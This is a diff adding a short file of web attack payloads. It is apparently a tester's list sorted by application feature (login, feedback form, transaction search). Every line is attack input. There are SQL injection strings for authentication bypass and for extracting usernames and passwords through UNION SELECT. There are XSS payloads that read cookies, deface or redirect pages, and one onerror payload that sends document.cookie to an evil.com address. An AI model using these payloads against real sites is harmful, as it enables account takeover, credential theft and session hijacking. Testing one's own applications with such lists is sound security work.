@@ -1,0 +1,24 @@
+SQL Injection
+admin' OR '1'='1'--
+' OR 1=1--
+' UNION SELECT null, null, null, null, null--
+admin'/**/--
+
+Feedback
+<script>alert('Stored XSS Attack!')</script>
+<img src=x onerror="alert('Cookie: '+document.cookie)">
+<script>document.body.innerHTML='<h1 style="color:red">HACKED!</h1>'</script>
+<script>window.location='https://example.com'</script>
+<script>window.location='https://example.com'</script>
+<img src=x onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">
+
+
+Transaction Search
+<script>alert('XSS Vulnerability Found!')</script>
+<img src=x onerror="alert('Cookie: '+document.cookie)">
+<script>window.location='https://example.com'</script>
+<script>console.log('Hacked!')</script>
+<script>document.body.style.background='red'</script>
+' OR '1'='1
+' UNION SELECT null, username, password, null FROM users--
+admin'--
